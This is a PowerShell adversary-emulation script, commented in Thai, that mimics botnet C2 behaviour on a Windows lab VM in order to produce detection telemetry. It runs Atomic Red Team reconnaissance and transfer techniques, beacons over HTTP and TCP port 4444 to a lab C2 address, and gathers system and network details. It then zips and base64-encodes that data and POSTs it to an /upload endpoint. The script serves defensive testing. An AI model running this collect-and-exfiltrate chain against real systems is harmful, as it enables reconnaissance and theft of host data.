# botnet_win.ps1 - botnet / C2 beaconing behaviour (Windows) ผ่าน Atomic Red Team
# คู่ขนานกับ scenarios/botnet.sh ฝั่ง Linux
#
# beaconing = ยิง HTTP/TCP ไปหา c2_server.py ของคุณเองในแล็บ
# (ส่งอย่างเดียว ไม่รับคำสั่งกลับมารัน - ได้ NetworkConnect telemetry ครบเท่ากัน)
#
# ATT&CK: T1016/T1049/T1018 Network Discovery, T1071.001 Web Protocols,
#         T1105 Ingress Tool Transfer, T1571 Non-Standard Port,
#         T1132.001 Data Encoding, T1041 Exfiltration Over C2
#
# ต้องรัน host/c2_server.py ก่อน (พอร์ต 8080 / 3333 / 4444)
# ⚠️ เลข test ทุกบรรทัดต้องมาจาก check_atomics.ps1 ที่รันใน VM จริง
#    ห้ามเว้นว่าง - Atomic() ที่ไม่ระบุเลขจะรัน "ทุก test" ของ technique นั้น
. "$PSScriptRoot\_lib.ps1"
Banner "botnet_win"
Setup-Sandbox

$c2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "192.168.56.1" }
$c2Port = if ($env:C2_PORT) { $env:C2_PORT } else { "8080" }
$bot = "C:\lab_sandbox\bot"
New-Item -ItemType Directory -Path $bot -Force | Out-Null

# ---------- Stage 1: network reconnaissance ----------
Write-Host "[botnet] network recon"
Atomic "T1016" "1,2,4,9"             # System Network Configuration Discovery
Atomic "T1049" "1,2,3"             # System Network Connections Discovery
Atomic "T1018" "1,4,5,8"             # Remote System Discovery

# recon เพิ่มเติมด้วย built-in (spawn process จริง -> ProcessCreate)
ipconfig /all      | Out-File "$bot\ipconfig.txt"
arp -a             | Out-File "$bot\arp.txt"
netstat -ano       | Out-File "$bot\netstat.txt"
route print        | Out-File "$bot\route.txt"
nslookup localhost | Out-File "$bot\dns.txt"

# ---------- Stage 2: beaconing ไป C2 ในแล็บ ----------
# วนถี่ๆ เพื่อให้ได้ NetworkConnect (EventID 3) หนาแน่น
Write-Host "[botnet] beacon -> ${c2Host}:${c2Port}"
$ok = 0; $fail = 0
for ($i = 1; $i -le 30; $i++) {
    # HTTP beacon
    try {
        Invoke-WebRequest -Uri "http://${c2Host}:${c2Port}/beacon?id=bot$i&host=$env:COMPUTERNAME" `
            -TimeoutSec 2 -UseBasicParsing | Out-Null
        $ok++
    } catch { $fail++ }

    # TCP beacon บนพอร์ตผิดปกติ (T1571)
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect($c2Host, 4444)
        $msg = [Text.Encoding]::ASCII.GetBytes("beacon $i from $env:COMPUTERNAME`n")
        $tcp.GetStream().Write($msg, 0, $msg.Length)
        $tcp.Close()
    } catch { }

    Start-Sleep -Seconds 2
}
Write-Host "[botnet] beacon ok=$ok fail=$fail"
if ($ok -eq 0) { Write-Host "[!] ไม่มี beacon สำเร็จเลย - c2_server.py เปิดอยู่ไหม? firewall?" }

# ---------- Stage 3: protocol / encoding / transfer ----------
Write-Host "[botnet] protocol + transfer"
Atomic "T1071.001" "1"         # Application Layer Protocol - Web
Atomic "T1132.001" "3"           # Data Encoding (windows test เดียวคือเลข 3)
Atomic "T1105" "7,8,9,10,11,12,15,16,17,22,24,25,29"             # Ingress Tool Transfer (ต้องมีเน็ต/NAT)

# ---------- Stage 4: staging + exfil จำลอง ----------
Write-Host "[botnet] staging + exfil"
systeminfo | Out-File "$bot\sysinfo.txt"
Get-ChildItem $bot -File | Out-File "$bot\manifest.txt"
Compress-Archive -Path "$bot\*.txt" -DestinationPath "$bot\staged.zip" -Force

# encode ก่อนส่ง (พฤติกรรมคลาสสิกของ bot)
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$bot\staged.zip"))
$b64 | Out-File "$bot\staged.b64"

try {
    Invoke-WebRequest -Uri "http://${c2Host}:${c2Port}/upload" -Method POST `
        -Body @{ host = $env:COMPUTERNAME; data = $b64.Substring(0, [Math]::Min(4000, $b64.Length)) } `
        -TimeoutSec 3 -UseBasicParsing | Out-Null
    Write-Host "[botnet] exfil sent"
} catch { Write-Host "[botnet] exfil fail (ปกติถ้า C2 ไม่เปิด)" }

# ---------- Cleanup ----------
# T1105 โหลดไฟล์ลงเครื่อง / T1071.001 ทิ้ง artifact ไว้ ถ้าไม่ล้างจะค้างข้ามรอบ
Write-Host "[botnet] cleanup"
Atomic-Cleanup "T1105" "7,8,9,10,11,12,15,16,17,22,24,25,29"
Atomic-Cleanup "T1071.001" "1"

Done-Banner "botnet_win"